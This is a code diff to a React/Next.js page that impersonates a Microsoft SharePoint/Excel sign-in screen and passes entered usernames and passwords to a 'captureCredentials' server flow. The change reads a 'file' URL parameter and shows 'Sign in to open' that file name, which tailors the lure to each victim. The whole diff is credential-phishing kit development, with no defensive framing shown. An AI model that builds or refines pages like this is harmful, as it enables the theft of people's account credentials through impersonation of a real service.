@@ -1,7 +1,8 @@
 'use client';
 
-import { FormEvent, useState } from 'react';
+import { FormEvent, useState, useEffect } from 'react';
 import Image from 'next/image';
+import { useSearchParams } from 'next/navigation';
 import { ShieldX, AlertTriangle } from 'lucide-react';
 
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
@@ -19,23 +20,30 @@ import {
 import { PlaceHolderImages } from '@/lib/placeholder-images';
 import { captureCredentials } from '@/ai/flows/capture-credentials';
 
-export default function SharePointLoginPage() {
+function SharePointLoginPageContent() {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [showSuccessAlert, setShowSuccessAlert] = useState(false);
   const [showErrorAlert, setShowErrorAlert] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+  const [fileName, setFileName] = useState('');
+
+  const searchParams = useSearchParams();
   const bgImage = PlaceHolderImages.find((img) => img.id === 'login-background');
 
-  // ------------------------
+  useEffect(() => {
+    const file = searchParams.get('file');
+    if (file) {
+      setFileName(file);
+    }
+  }, [searchParams]);
+
   // Handle Form Submission
-  // ------------------------
   const handleSubmit = async (event: FormEvent) => {
     event.preventDefault();
     setIsLoading(true);
     setShowErrorAlert(false);
     try {
-      // Send credentials to the server-side flow.
       await captureCredentials({ username, password });
       setShowSuccessAlert(true);
     } catch (error) {
@@ -76,7 +84,7 @@ export default function SharePointLoginPage() {
             />
           </div>
           <CardTitle className="text-2xl font-semibold text-[#0078D4]">
-            Sign in to Excel
+            {fileName ? `Sign in to open ${fileName}` : 'Sign in to Excel'}
           </CardTitle>
         </CardHeader>
 
@@ -192,5 +200,14 @@ export default function SharePointLoginPage() {
         </AlertDialogContent>
       </AlertDialog>
     </div>
+  );
+}
+
+
+export default function SharePointLoginPage() {
+  return (
+    <React.Suspense fallback={<div>Loading...</div>}>
+      <SharePointLoginPageContent />
+    </React.Suspense>
   );
 }
